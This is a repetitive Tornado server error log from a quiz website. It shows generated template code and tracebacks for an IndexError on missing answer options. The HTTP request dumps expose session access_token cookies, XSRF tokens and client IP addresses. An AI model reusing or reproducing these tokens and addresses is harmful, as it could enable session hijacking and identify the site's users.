 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c385c8e4c854802b2dbcb&answers=%5B0%5D&cursor=10&_xsrf=07b7ea1532da4c3e901fa020bfb7269f', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFGdEZaQ1UwbERUWkJTQXNMekJwM2taQmdVbWFHTWFaQ3BseVRXRzVaQ3R1blRJMVdyVzdJR05PeU10ZVpBdHM4R2ppaUFrQUI1NWY1cGs2bUxXa0h0Z0w2RGVtdHNUUVpEWkQ=|1348220923|035334a7569d378f218b918be8f7fe4ff2a51d6d"; _xsrf=07b7ea1532da4c3e901fa020bfb7269f; __utma=188782963.1312975164.1348220900.1348220900.1348220900.1; __utmb=188782963.5.10.1348220900; __utmc=188782963; __utmz=188782963.1348220900.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 124.64ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c385c8e4c854802b2dbcb&answers=%5B0%5D&cursor=10&_xsrf=07b7ea1532da4c3e901fa020bfb7269f', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFGdEZaQ1UwbERUWkJTQXNMekJwM2taQmdVbWFHTWFaQ3BseVRXRzVaQ3R1blRJMVdyVzdJR05PeU10ZVpBdHM4R2ppaUFrQUI1NWY1cGs2bUxXa0h0Z0w2RGVtdHNUUVpEWkQ=|1348220923|035334a7569d378f218b918be8f7fe4ff2a51d6d"; _xsrf=07b7ea1532da4c3e901fa020bfb7269f; __utma=188782963.1312975164.1348220900.1348220900.1348220900.1; __utmb=188782963.5.10.1348220900; __utmc=188782963; __utmz=188782963.1348220900.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 73.83ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c3c478e4c854802b2dbcc&answers=%5B0%2C2%2C3%5D&cursor=2&_xsrf=4080daf3104b4e8e8e3ca92ab5b023a8', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '100', 'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '94.169.91.254', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFBUTNKSHE0dWxRWkFrSlJDWVVvR0R5N2hpaUZudzlManJuZ1VNMVpCNkx1ZWsxbFFPUkZqSDhzZk1aQUlQcE5HME1idVJyYU1wcXFQWkJFUk91b3dhUXJ1M1JwMFFaRFpE|1348222018|d905cb71fa9c3b36d4dcb2cbc1904734ab972dc3; _xsrf=4080daf3104b4e8e8e3ca92ab5b023a8; __utmz=188782963.1348083281.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmc=188782963; __utmb=188782963.3.10.1348222001; __utma=188782963.747762148.1348083281.1348083281.1348222001.2', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 83.66ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
